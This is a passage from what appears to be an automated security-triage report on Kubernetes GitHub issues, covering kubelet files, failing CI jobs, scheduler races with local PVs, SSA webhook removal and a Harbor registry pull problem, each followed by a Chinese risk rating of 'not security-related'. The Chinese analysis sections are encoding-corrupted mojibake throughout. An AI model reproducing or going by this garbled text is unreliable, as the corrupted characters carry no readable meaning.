#### Kubernetes version

<details>

```console
$ kubectl version
# paste output here
```

</details>


#### Cloud provider

<details>

</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

_No response_

#### Related plugins (CNI, CSI, ...) and versions (if applicable)

_No response_

### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä¸æ¶‰åŠ

**åˆ¤æ–­ä¾æ®ï¼š**  
è¯¥Issueæè¿°äº†åœ¨å•æ ˆKubernetesé›†ç¾¤ä¸­ï¼Œå½“é›†ç¾¤ä¸æ”¯æŒ`PreferDualStack`ç½‘ç»œç­–ç•¥æ—¶ï¼ŒæœåŠ¡é…ç½®çš„`externalTrafficPolicy: Local`è®¾ç½®æ²¡æœ‰è¢«æ­£ç¡®éµå¾ªï¼Œè€Œæ˜¯å›é€€åˆ°äº†é»˜è®¤çš„`externalTrafficPolicy: Cluster`ã€‚è¿™å¯èƒ½å¯¼è‡´æ„å¤–çš„æµé‡è·¯ç”±å’Œå®¢æˆ·ç«¯æºIPä¸¢å¤±ã€‚

`externalTrafficPolicy: Local`çš„ä½œç”¨æ˜¯ç¡®ä¿æµé‡ä»…è·¯ç”±åˆ°æœ¬åœ°æœ‰å¯ç”¨ç«¯ç‚¹çš„èŠ‚ç‚¹ï¼Œå¹¶ä¿ç•™å®¢æˆ·ç«¯çš„æºIPåœ°å€ã€‚å¦‚æœè¯¥è®¾ç½®æœªè¢«éµå¾ªï¼Œå¯èƒ½ä¼šå½±å“åˆ°éœ€è¦æºIPä¿¡æ¯çš„åº”ç”¨ç¨‹åºï¼Œå¦‚æ—¥å¿—è®°å½•ã€åŸºäºIPçš„è®¿é—®æ§åˆ¶ç­‰ã€‚

ç„¶è€Œï¼Œè¿™ä¸€é—®é¢˜å¹¶ä¸å¯¼è‡´ä»»ä½•å¯è¢«æ”»å‡»è€…åˆ©ç”¨çš„å®‰å…¨æ¼æ´ã€‚å®ƒä¸ä¼šå¼•èµ·æƒé™æå‡ã€å‘½ä»¤æ‰§è¡Œã€å®¹å™¨é€ƒé€¸ç­‰é«˜é£é™©å®‰å…¨é—®é¢˜ã€‚æ­¤é—®é¢˜å±äºåŠŸèƒ½æ€§ç¼ºé™·ï¼Œå½±å“äº†æœåŠ¡çš„é¢„æœŸè¡Œä¸ºï¼Œä½†ä¸æ¶‰åŠå®‰å…¨é£é™©ã€‚

æ ¹æ®æä¾›çš„é£é™©åˆ¤æ–­æ ‡å‡†ï¼Œæ­¤Issueä¸æ¶‰åŠå®‰å…¨é£é™©ã€‚

---

## Issue #128173 When is the directory created? /var/lib/kubelet/pods/{podUID}/container 

- Issue é“¾æ¥ï¼š[#128173](https://github.com/kubernetes/kubernetes/issues/128173)

### Issue å†…å®¹

#### What happened?

An empty file named cb6f3303 exists in the /var/lib/kubelet/pods/d425bb07-0dac-409d-ba2d-242afbc213eb/containers/init directory. Is this file created by kubelet or when the container runtime? If it was created by kubelet, where is the code?

#### What did you expect to happen?

I want to know when the files under /var/lib/kubelet/pods/d425bb07-0dac-409d-ba2d-242afbc213eb/containers/init are created.

#### How can we reproduce it (as minimally and precisely as possible)?

View Directory /var/lib/kubelet/pods/d425bb07-0dac-409d-ba2d-242afbc213eb/containers/init

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version
# paste output here
```
1.28
</details>


#### Cloud provider

<details>

</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä¸æ¶‰åŠ

**åˆ¤æ–­ä¾æ®ï¼š**  
è¯¥Issueçš„æäº¤è€…è¯¢é—®åœ¨Kubernetesçš„`/var/lib/kubelet/pods/{podUID}/containers/init`ç›®å½•ä¸‹å‡ºç°çš„ä¸€ä¸ªç©ºæ–‡ä»¶`cb6f3303`çš„åˆ›å»ºæ—¶æœºï¼Œæ˜¯å¦ç”±kubeletæˆ–å®¹å™¨è¿è¡Œæ—¶åˆ›å»ºï¼Œå¹¶å¸Œæœ›äº†è§£å…·ä½“çš„ä»£ç ä½ç½®ã€‚æ­¤é—®é¢˜åªæ˜¯å¯¹Kuberneteså†…éƒ¨æ–‡ä»¶ç”Ÿæˆæœºåˆ¶çš„æŠ€æœ¯æ€§æé—®ï¼Œæ²¡æœ‰æ¶‰åŠä»»ä½•å®‰å…¨é£é™©ï¼Œä¹Ÿæœªæš´éœ²æ•æ„Ÿä¿¡æ¯æˆ–å­˜åœ¨æ¼æ´ã€‚æ ¹æ®é£é™©åˆ¤æ–­æ ‡å‡†ç¬¬6æ¡ï¼šå¦‚æœIssueä¸æ¶‰åŠå®‰å…¨é—®é¢˜ï¼Œåˆ™é£é™©è¯„çº§åˆ¤æ–­ä¸ºä¸æ¶‰åŠã€‚

---

## Issue #128171 [Failing Tests] ci-crio-cgroupv1-node-e2e-conformance.Overall (impacting multiple jobs)

- Issue é“¾æ¥ï¼š[#128171](https://github.com/kubernetes/kubernetes/issues/128171)

### Issue å†…å®¹

#### Which jobs are failing?
* master-blocking:
  * ci-crio-cgroupc1-node-e2e-conformance
  * ci-node-e2e
  * gce-cos-master-scalability-100

#### Which tests are failing?
Node conformance test

ci-crio-cgroupv1-node-e2e-conformance.Overall

#### Since when has it been failing?
[10/17 10:52 CDT](https://prow.k8s.io/view/gs/kubernetes-ci-logs/logs/ci-crio-cgroupv1-node-e2e-conformance/1846942196620595200)

#### Testgrid links
https://testgrid.k8s.io/sig-release-master-blocking#ci-crio-cgroupc1-node-e2e-conformance
https://testgrid.k8s.io/sig-release-master-blocking#ci-node-e2e
https://testgrid.k8s.io/sig-release-master-blocking#gce-cos-master-scalability-100

#### Reason for failure (if possible)
```
{ failed [FAILED] system validation
Expected success, but got an error:
    <*fmt.wrapError | 0xc001490e80>: 
    system validation failed: exit status 1
    {
        msg: "system validation failed: exit status 1",
        err: <*exec.ExitError | 0xc001490e60>{
            ProcessState: {
                pid: 3129,
                status: 256,
                rusage: {
                    Utime: {Sec: 0, Usec: 184345},
                    Stime: {Sec: 0, Usec: 64265},
                    Maxrss: 98988,
                    Ixrss: 0,
                    Idrss: 0,
                    Isrss: 0,
                    Minflt: 11248,
                    Majflt: 0,
                    Nswap: 0,
                    Inblock: 0,
                    Oublock: 0,
                    Msgsnd: 0,
                    Msgrcv: 0,
                    Nsignals: 0,
                    Nvcsw: 953,
                    Nivcsw: 287,
                },
            },
            Stderr: nil,
        },
    }
In [SynchronizedBeforeSuite] at: k8s.io/kubernetes/test/e2e_node/e2e_node_suite_test.go:232 @ 10/17/24 16:09:25.314
}
```
and
```
{ failed [FAILED] ï¿½[1mï¿½[38;5;9mSynchronizedBeforeSuite failed on Ginkgo parallel process #1ï¿½[0m
  The first SynchronizedBeforeSuite function running on Ginkgo parallel process
  #1 failed.  This suite will now abort.

In [SynchronizedBeforeSuite] at: k8s.io/kubernetes/test/e2e_node/e2e_node_suite_test.go:230 @ 10/17/24 16:09:25.322
}
```

#### Anything else we need to know?
Since commit 9568a2ac1 traced back to this PR: https://github.com/kubernetes/kubernetes/pull/128149

#### Relevant SIG(s)
/sig node
/milestone 1.32
/kind failing-test
cc: @kubernetes/release-team-release-signal 



### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä¸æ¶‰åŠ

**åˆ¤æ–­ä¾æ®ï¼š**  
è¯¥IssueæŠ¥å‘Šäº†ä¸€äº›CIæµ‹è¯•å¤±è´¥çš„æƒ…å†µï¼ŒåŒ…æ‹¬`ci-crio-cgroupv1-node-e2e-conformance`ç­‰Jobï¼Œé”™è¯¯ä¿¡æ¯æ˜¾ç¤ºç³»ç»ŸéªŒè¯å¤±è´¥ï¼Œä½†å¹¶æœªæš´éœ²ä»»ä½•æ•æ„Ÿä¿¡æ¯æˆ–æ½œåœ¨çš„å®‰å…¨é£é™©ã€‚é”™è¯¯ä¿¡æ¯ä¸­æåˆ°çš„è·¯å¾„`k8s.io/kubernetes/test/e2e_node/e2e_node_suite_test.go`æ˜¯å…¬å¼€çš„ä»£ç è·¯å¾„ï¼Œä¸å­˜åœ¨æ•æ„Ÿä¿¡æ¯æ³„éœ²ã€‚Issueçš„å†…å®¹ä¸»è¦æ¶‰åŠæµ‹è¯•å¤±è´¥çš„æ’æŸ¥ï¼Œä¸æ¶‰åŠå®‰å…¨é£é™©ã€‚

---

## Issue #128164 Race when scheduling statefulset pods with local PV, resulting in pods pending forever

- Issue é“¾æ¥ï¼š[#128164](https://github.com/kubernetes/kubernetes/issues/128164)

### Issue å†…å®¹

#### What happened?

A statefulset has a volumeclaimtemplate which uses a local PV storage class. The PVs created by this storage class are tightly bound to a single node.

In this example lets say that ordinal 0 of the statefulset is running on node A with a PVC which is bound to a PV on node A as well.

1. delete the PVC for ordinal 0
2. immediately after, delete the pod for ordinal 0
3. the new pod for ordinal 0 gets scheduled on node A
4. the new PVC/PV for ordinal 0 gets bound to node B
5. the new pod is stuck in Pending state forever since the new PVC is only available on node B

I believe the issue is that the scheduler when scheduling the new pod is looking at the OLD PVC object which is the progress of being deleted. Since PVCs are referenced by name and statefulsets use consistent naming for PVCs, the scheduler can use the old PVC definition when doing Filter decisions.
This can happen if the pod informer/watcher in the scheduler is ahead of the pvc informer/watcher.

#### What did you expect to happen?

The scheduler should not place pods using local PVs in an unschedulable state.

#### How can we reproduce it (as minimally and precisely as possible)?

Create a statefulset with a local PVC claimref. Delete the pod and pvc for an ordinal at the same time. Retry until the pod is stuck in Pending state.

#### Anything else we need to know?

Thinking about possible solutions:
1. in the scheduler, do not use deleting PVCs/PVs when placing the pod. this does not fix the race but it most likely reduces the frequency
2. in the scheduler, form a consistent snapshot where all objects used in scheduling decisions are from the same ETCD revision (I tried to see if there is anything in the k8s project that does this but I couldn't find anything)
3. in the statefulset controller, create an owner reference on PVCs to owning pod. during scheduling, if the PVC is not owned by the pod being scheduled, backoff.

#### Kubernetes version

<details>

```console
$ kubectl version
1.29.9
```

</details>


#### Cloud provider

<details>

</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä¸æ¶‰åŠ

**åˆ¤æ–­ä¾æ®ï¼š**  
ç»è¿‡åˆ†æï¼Œè¯¥Issueæè¿°äº†åœ¨ä½¿ç”¨æœ¬åœ°æŒä¹…å·ï¼ˆLocal PVï¼‰çš„StatefulSetä¸­ï¼Œåˆ é™¤PVCå’ŒPodæ—¶å¯èƒ½å‡ºç°è°ƒåº¦ç«æ€æ¡ä»¶ï¼Œå¯¼è‡´Podæ°¸è¿œå¤„äºPendingçŠ¶æ€ã€‚è¿™æ˜¯ç”±äºè°ƒåº¦å™¨å¯èƒ½åŸºäºæ­£åœ¨åˆ é™¤çš„æ—§PVCä¿¡æ¯è¿›è¡Œå†³ç­–ï¼Œå¯¼è‡´Podè¢«è°ƒåº¦åˆ°é”™è¯¯çš„èŠ‚ç‚¹ã€‚

æ ¹æ®é£é™©åˆ¤æ–­æ ‡å‡†ï¼š

1. è¯¥é—®é¢˜éœ€è¦æœ‰æƒé™åˆ é™¤PVCå’ŒPodçš„æ“ä½œï¼Œå±äºæ­£å¸¸çš„é›†ç¾¤ç®¡ç†æ“ä½œã€‚
2. è¯¥é—®é¢˜ä¸ä¼šè¢«æ”»å‡»è€…åˆ©ç”¨æ¥é€ æˆæƒé™æå‡ã€æ•°æ®æ³„éœ²æˆ–è¿œç¨‹ä»£ç æ‰§è¡Œç­‰é«˜å±å®‰å…¨é—®é¢˜ã€‚
3. ä¸æ¶‰åŠæ—¥å¿—æ³„éœ²æ•æ„Ÿä¿¡æ¯ã€‚
4. ä¸å±äºæ‹’ç»æœåŠ¡æ”»å‡»ä¸­çš„é«˜é£é™©åœºæ™¯ï¼Œå› ä¸ºéœ€è¦æœ‰è¾ƒé«˜æƒé™çš„æ“ä½œæ‰èƒ½è§¦å‘ã€‚

å› æ­¤ï¼Œæ­¤Issueä¸æ¶‰åŠå®‰å…¨é£é™©ã€‚

---

## Issue #128151 Control-plane unexpected node to "Not Ready"

- Issue é“¾æ¥ï¼š[#128151](https://github.com/kubernetes/kubernetes/issues/128151)

### Issue å†…å®¹

#### What happened?

#### What happened?

Server running fine and seems unexpected lost of connection, I have attached the main logs of messages, and I will explain my analysis:
Sep 26 07:11:39 kubelet started to show "Error updating node status"

At 07:12:00 Lost connection with the pods running in qos1

Sep 26 07:12:03 kubelet shows that update node exceeds retry count.

The logs repeat again and again.

Sep 26 07:16:25 qos1 sssd_be[1077]: Backend is offline

And almost 6 hours later  qos server got reconnected and I can access the server.

One thing that catches my attention is  the following log:
Sep 26 13:11:10 qos1 Keepalived_vrrp[1512]: Interface cali9f8d8b57766 deleted

Nominally there is always a previous log indicating that the inteface cali****** has been added but for cali9f8d8b57766 interface it does not show.

Keepalived has been working perfectly and it does not show any restart or shutdown.

[logs.txt](https://github.com/user-attachments/files/17409957/logs.txt)



#### What did you expect to happen?

It should not occur and or at least not lose connection with the server.  The node was not ready and recovered itself after almost 6 hours.

#### How can we reproduce it (as minimally and precisely as possible)?

I have 9 nodes, 3 control-plane, master and 6 workers.
qos1 is one of the 3 control-plane, master

#### Anything else we need to know?

This is the second time this occurs, first time the node was ready instantly but this time the node was "Not Ready" for almost 6 hours. 
The other 2 nodes [control-plane, master] have not shown this behavior. 

#### Kubernetes version

<details>

```console
$ kubectl version
Client Version: version.Info{Major:"1", Minor:"20", GitVersion:"v1.20.0", GitCommit:"af46c47ce925f4c4ad5cc8d1fca46c7b77d13b38", GitTreeState:"clean", BuildDate:"2020-12-08T17:59:43Z", GoVersion:"go1.15.5", Compiler:"gc", Platform:"linux/amd64"}
(machine is running in 2020 so ignore date)
```
</details>


#### Cloud provider

<details>
Bare metal
</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
NAME="Oracle Linux Server"
VERSION="8.5"
ID="ol"
ID_LIKE="fedora"
VARIANT="Server"
VARIANT_ID="server"
VERSION_ID="8.5"
PLATFORM_ID="platform:el8"
PRETTY_NAME="Oracle Linux Server 8.5"
ANSI_COLOR="0;31"
CPE_NAME="cpe:/o:oracle:linux:8:5:server"
HOME_URL="https://linux.oracle.com/"
BUG_REPORT_URL="https://bugzilla.oracle.com/"

ORACLE_BUGZILLA_PRODUCT="Oracle Linux 8"
ORACLE_BUGZILLA_PRODUCT_VERSION=8.5
ORACLE_SUPPORT_PRODUCT="Oracle Linux"
ORACLE_SUPPORT_PRODUCT_VERSION=8.5
$ uname -a
Linux qos2 5.4.17-2011.7.4.el8uek.x86_64 #2 SMP Fri Oct 2 14:39:04 PDT 2020 x86_64 x86_64 x86_64 GNU/Linux
(machine is running in 2020 so ignore date)
```
</details>

#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä¸æ¶‰åŠ

**åˆ¤æ–­ä¾æ®ï¼š**  
è¯¥Issueæè¿°äº†ä¸€ä¸ªKubernetesé›†ç¾¤ä¸­æ§åˆ¶å¹³é¢èŠ‚ç‚¹æ„å¤–è¿›å…¥"Not Ready"çŠ¶æ€çš„é—®é¢˜ï¼Œå‡ºç°äº†kubeletæ— æ³•æ›´æ–°èŠ‚ç‚¹çŠ¶æ€ã€è¿æ¥ä¸¢å¤±ã€sssdåç«¯ç¦»çº¿ç­‰æƒ…å†µã€‚è¿™äº›ç—‡çŠ¶è¡¨æ˜èŠ‚ç‚¹å¯èƒ½å­˜åœ¨ç½‘ç»œä¸­æ–­ã€æœåŠ¡å¼‚å¸¸æˆ–ç¡¬ä»¶æ•…éšœç­‰é—®é¢˜ã€‚ä»æè¿°æ¥çœ‹ï¼Œæ²¡æœ‰æ¶‰åŠåˆ°æ½œåœ¨çš„å®‰å…¨é£é™©ï¼Œä¹Ÿæ²¡æœ‰æåŠä»»ä½•å¯èƒ½è¢«æ”»å‡»è€…åˆ©ç”¨çš„æ¼æ´ã€‚

æ ¹æ®é£é™©åˆ¤æ–­æ ‡å‡†ï¼š

1. è¯¥é£é™©ä¸èƒ½è¢«æ”»å‡»è€…åˆ©ç”¨ã€‚
2. ä¸æ¶‰åŠå¯èƒ½è¢«åˆ†é…CVEç¼–å·çš„æ¼æ´ã€‚
3. Issueæäº¤è€…æ²¡æœ‰æš´éœ²æ•æ„Ÿä¿¡æ¯ã€‚
6. Issueä¸æ¶‰åŠå®‰å…¨é—®é¢˜ï¼Œé£é™©è¯„çº§åˆ¤æ–­ä¸ºä¸æ¶‰åŠã€‚

---

## Issue #128141 Sts pod pending in scheduler cache

- Issue é“¾æ¥ï¼š[#128141](https://github.com/kubernetes/kubernetes/issues/128141)

### Issue å†…å®¹

#### What happened?

1 . we found the mysql pod is pending , but its pvc is already bounded, the pods show as follows
```
[root@sphere-node-1 ~]# kubectl get po -n mysql
NAME                                   READY   STATUS    RESTARTS   AGE
mysql-0-0                         0/1     Pending   0          4h4m
mysql-1-0                         1/1     Running   0          15d
mysql-2-0                         1/1     Running   0          5h7m
mysql-exporter-7c45cbc7b7-9dfh4   1/1     Running   0          15d
[root@sphere-node-1 ~]# kubectl get pvc -n mysql
NAME                 STATUS   VOLUME                                     CAPACITY   ACCESS MODES   STORAGECLASS                        AGE
mysql-0-0   Bound    pvc-114695a3-885e-4a87-9e7d-75d76cf059e5   50Gi       RWO            hostpath-data-meta             15d
mysql-1-0   Bound    pvc-0f186afd-bb87-4b3a-97a7-5aae6f071c3f   50Gi       RWO            hostpath-data-meta             15d
mysql-2-0   Bound    pvc-cd92c657-3c88-46e8-8352-22d5ecb46fe9   50Gi       RWO            hostpath-data-meta             5h7m



I1016 06:29:42.137250       1 schedule_one.go:826] "Unable to schedule pod; no fit; waiting" pod="mysql/mysql-0-0" err="0/5 nre available: 1 node(s) didn't match pod anti-affinity rules, 2 node(s) didn't match Pod's node affinity/selector, 2 node(s) had volumeaffinity conflict. preemption: 0/5 nodes are available: 1 node(s) didn't match pod anti-affinity rules, 4 Preemption is not helpful foruling."

```

2. But the sheduler cache info shows the  one mysql-2-0  is Running in node-6, and one mysql-2-0  is pending in node-3
```
Node name:  node-6
name: ccos-mysql-2-0, namespace: ccos-mysql, uid: cd835665-9889-4e04-8c75-05b7ae984dc9, phase: Running, nominated node:

Node name:  node-3
name: ccos-mysql-2-0, namespace: ccos-mysql, uid: 2a3ab7ba-a9c1-404d-b4e4-e7dcfd91578c, phase: Pending, nominated node:

 1 dumper.go:62] "Dump of scheduling queue" pods=<
        name: ccos-mysql-0-0, namespace: ccos-mysql, uid: f10be0d0-c41d-4629-a8ce-4002ecf8b4c3, phase: Pending, nominated node:

```

#### What did you expect to happen?

The sts pod should not exists in Running and Pending state at the same time

#### How can we reproduce it (as minimally and precisely as possible)?

remove one sts pod and try to create one new

related to https://github.com/kubernetes/kubernetes/issues/121866

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version
# paste output here
```
1.25.8

</details>


#### Cloud provider

<details>

</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```
5.15.131-9
</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä¸æ¶‰åŠ

**åˆ¤æ–­ä¾æ®ï¼š**  
è¯¥Issueæè¿°äº†Kubernetesé›†ç¾¤ä¸­StatefulSetï¼ˆstsï¼‰Podåœ¨è°ƒåº¦è¿‡ç¨‹ä¸­å‡ºç°äº†ç¼“å­˜ä¸ä¸€è‡´çš„æƒ…å†µï¼Œå¯¼è‡´åŒä¸€ä¸ªPodåŒæ—¶å¤„äºPendingå’ŒRunningçŠ¶æ€ã€‚è¿™å¯èƒ½æ˜¯ç”±äºè°ƒåº¦å™¨ç¼“å­˜æœªåŠæ—¶æ›´æ–°å¼•èµ·çš„è°ƒåº¦å¼‚å¸¸ã€‚ç„¶è€Œï¼Œæ ¹æ®æä¾›çš„é£é™©åˆ¤æ–­æ ‡å‡†ï¼Œæ­¤é—®é¢˜ä¸æ¶‰åŠå®‰å…¨é£é™©ï¼š

1. è¯¥é—®é¢˜å±äºè°ƒåº¦å™¨çš„åŠŸèƒ½æ€§Bugï¼Œå¹¶ä¸èƒ½è¢«æ”»å‡»è€…åˆ©ç”¨æ¥è·å¾—æœªæˆæƒçš„è®¿é—®æˆ–æƒé™æå‡ã€‚
2. æ²¡æœ‰è¿¹è±¡è¡¨æ˜æ­¤é—®é¢˜ä¼šå¯¼è‡´å‘½ä»¤æ‰§è¡Œã€å®¹å™¨é€ƒé€¸ã€ææƒç­‰é«˜å®‰å…¨é£é™©çš„é—®é¢˜ã€‚
3. æ­¤é—®é¢˜ä¸ä¼šå¯¼è‡´æ•æ„Ÿä¿¡æ¯æ³„éœ²ã€æ‹’ç»æœåŠ¡ï¼ˆDoSï¼‰æ”»å‡»ç­‰å®‰å…¨äº‹ä»¶ã€‚

å› æ­¤ï¼Œç»¼åˆåˆ¤æ–­ï¼Œè¯¥Issueä¸æ¶‰åŠå®‰å…¨é£é™©ã€‚

---

## Issue #128102 Unable to SSA remove array entry containing nested field with "foreign" owner

- Issue é“¾æ¥ï¼š[#128102](https://github.com/kubernetes/kubernetes/issues/128102)

### Issue å†…å®¹

#### What happened?

We are in the process of removing a long-time deprecated API version in one of our internal operators. We have done this process before, and are familiar with how it should be done. But since then, we have migrated all our code to use SSA. While this in general has been a pleasant experience, we hit a major issue when our CI/CD pipeline attempted to delete obsolete webhooks from our webhook configuration resources (using SSA). We have both validating and mutating webhooks. The same error was reported for both, and I will use the validating webhook in the following description.

When the pipeline attempts to SSA the webhook configuration, we got the following error:

````
Error from server (Invalid): ValidatingWebhookConfiguration.admissionregistration.k8s.io "application-operator-validating-webhook-configuration" is invalid: [webhooks[2].sideEffects: Required value: must specify one of None, NoneOnDryRun, webhooks[2].clientConfig: Required value: exactly one of url or service is required, webhooks[2].admissionReviewVersions: Required value: must specify one of v1, v1beta1]
````

Pretty cryptic error message, but I am pretty sure this is caused by "foreign" ownership to selected nested fields in the array item that the pipeline is trying to remove, making the item retain with invalid configuration and thus rejected by the SSA. Looking at the managed fields confirms my suspicion:

````yaml
managedFields:
    - manager: cert-manager-cainjector
      operation: Apply
      apiVersion: admissionregistration.k8s.io/v1
      time: '2024-09-03T08:00:49Z'
      fieldsType: FieldsV1
      fieldsV1:
        'f:webhooks':
          'k:{"name":"v1alpha1-stasjob-validator.stas.statnett.no"}':
            .: {}
            'f:clientConfig':
              'f:caBundle': {}
            'f:name': {}
          'k:{"name":"v1beta2-application-validator.stas.statnett.no"}':
            .: {}
            'f:clientConfig':
              'f:caBundle': {}
            'f:name': {}
          'k:{"name":"v1beta2-stasjob-validator.stas.statnett.no"}':
            .: {}
            'f:clientConfig':
              'f:caBundle': {}
            'f:name': {}
````

As we use cert-manager to inject the webhook CA bundle, it owns a single nested field in each array item as expected. Note: We have enabled the ServerSideApply feature gate in cert-manager, if that matters.

#### What did you expect to happen?

I would expect the obsolete/removed webhook to be removed without error from the array of webhooks in the webhook configuration resource.

#### How can we reproduce it (as minimally and precisely as possible)?

There are probably many ways to reproduce this issue. But to reproduce the issue in the same context as us, I would suggest the following:

1. Install cert-manager with mostly default options. We have enabled the c-m ServerSideApply feature gate, but I don't think it matters.
2. Add/update a ValidatingWebhookConfiguration containing at least two webhooks **using SSA**.
3. Create a cert-manager `Certificate` for your webhook.
4. Request injection of webhook CA bundle by cert-manager ca-injector adding an annotation to the VWC: `cert-manager.io/inject-ca-from: $(CERTIFICATE_NAMESPACE)/$(CERTIFICATE_NAME)`
5. Wait for cert-manager to reconcile the VWC (`caBundle` should be injected)
6. Attempt to remove one of the webhooks from the VMC, still **using SSA**:

#### Anything else we need to know?

This issue was initially raised on sig-api-machinery Slack: https://kubernetes.slack.com/archives/C0EG7JC6T/p1728996348284339

It is also worth mentioning that a temporary rollback to use client-side apply (a.k.a. Update) in our pipeline appears as a workaround for this issue. We successfully used this approach to finalize our removal of the obsolete API version.

#### Kubernetes version

<details>

```console
$ kubectl version
Client Version: v1.29.7
Kustomize Version: v5.0.4-0.20230601165947-6ce0bf390ce3
Server Version: v1.29.8+632b078
```

</details>


#### Cloud provider

<details>
N/A OpenShift on VMWare
</details>


#### OS version

<details>

N/A RCOS (OpenShift)

</details>


#### Install tools

<details>
N/A
</details>


#### Container runtime (CRI) and version (if applicable)

<details>
N/A
</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>
N/A
</details>


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä¸æ¶‰åŠ

**åˆ¤æ–­ä¾æ®ï¼š**  
è¯¥Issueæè¿°äº†åœ¨ä½¿ç”¨æœåŠ¡å™¨ç«¯åº”ç”¨(SSA)æ—¶ï¼Œæ— æ³•åˆ é™¤å«æœ‰ç”±å…¶ä»–ç®¡ç†è€…æ‹¥æœ‰çš„åµŒå¥—å­—æ®µçš„æ•°ç»„é¡¹çš„é—®é¢˜ã€‚å…·ä½“æ¥è¯´ï¼Œå½“cert-manageræ³¨å…¥äº†`caBundle`å­—æ®µå¹¶æ‹¥æœ‰è¯¥å­—æ®µåï¼Œè¯•å›¾é€šè¿‡SSAåˆ é™¤åŒ…å«è¯¥å­—æ®µçš„æ•°ç»„é¡¹ä¼šå¯¼è‡´é”™è¯¯ã€‚è¿™ä¼¼ä¹æ˜¯ç”±äºSSAçš„å­—æ®µæ‰€æœ‰æƒæœºåˆ¶å¼•èµ·çš„ã€‚

ä»å®‰å…¨è§’åº¦æ¥çœ‹ï¼Œæ­¤é—®é¢˜å¹¶æœªæ¶‰åŠåˆ°å¯è¢«æ”»å‡»è€…åˆ©ç”¨çš„å®‰å…¨æ¼æ´ã€‚åˆ é™¤Webhooké…ç½®éœ€è¦è¶³å¤Ÿçš„æƒé™ï¼Œä¸”è¯¥é—®é¢˜ä¸ä¼šå¯¼è‡´æƒé™æå‡ã€æ•æ„Ÿä¿¡æ¯æ³„éœ²æˆ–è¿œç¨‹ä»£ç æ‰§è¡Œç­‰é«˜é£é™©å®‰å…¨é—®é¢˜ã€‚å› æ­¤ï¼Œè¯¥Issueä¸æ¶‰åŠå®‰å…¨é£é™©ã€‚

---

## Issue #128057 Kubernetes cannot pull from a Private Registry deployed with ClusterIP

- Issue é“¾æ¥ï¼š[#128057](https://github.com/kubernetes/kubernetes/issues/128057)

### Issue å†…å®¹

#### What happened?

I'm hosting a private registry using Harbor like such like such:

Link to Harbor Ticket, but I believe this is a kubernetes issue or limitation: https://github.com/goharbor/harbor-helm/issues/1838

I deploy it via a Helmfile

```
# helmfile.dev.yaml
repositories:
  - name: harbor
    url: https://helm.goharbor.io

releases:
  - name: harbor
    chart: harbor/harbor
    namespace: harbor
    values:
      - expose:
          type: clusterIP
        externalURL: "http://harbor.harbor.svc.cluster.local:80"
        persistence:
          enabled: true
          persistentVolumeClaim:
            registry:
              size: 10Gi
```

I am able to push to it using a simple kaniko job like such
```
apiVersion: batch/v1
kind: Job
metadata:
  labels:
    job-name: build-hello-world-0.0.0-test-3
  name: build-hello-world-0.0.0-test-3
  namespace: default
spec:
  template:
    metadata:
      labels:
        job-name: build-hello-world-0.0.0-test-3
    spec:
      containers:
      - args:
        - --context=tar:///mnt/build-contexts/1234567890/context.tar.gz
        - --dockerfile=Dockerfile
        - --destination=harbor.harbor.svc.cluster.local:80/hello-world:0.0.0
        - --verbosity=debug
        image: gcr.io/kaniko-project/executor:latest
        imagePullPolicy: IfNotPresent
        env:
          - name: DOCKER_CONFIG
            value: /kaniko/.docker
        name: kaniko
        volumeMounts:
        - mountPath: /mnt/build-contexts
          name: build-context-pvc
        - mountPath: /kaniko/.docker
          name: build-registry-secret
      restartPolicy: Never
      volumes:
      - name: build-context-pvc
        persistentVolumeClaim:
          claimName: build-context-pvc
      - name: build-registry-secret
        secret:
          defaultMode: 420
          secretName: build-registry-creds
```

However, when I try to make a dimple deployment based on this image that I've successfully pushed, I get this erroring event

```
â”‚ Events:                                                                                                                                                                                                                                            â”‚
â”‚---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------â”‚
â”‚ Type      Reason     Age                   From               Message                                                                                                                                                                            â”‚
â”‚---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------â”‚
â”‚ Normal    Scheduled  13m                   default-scheduler  Successfully assigned default/hello-world-864ce95b-build-57f7d5f68f-lf6vd to minikube                                                                                              â”‚
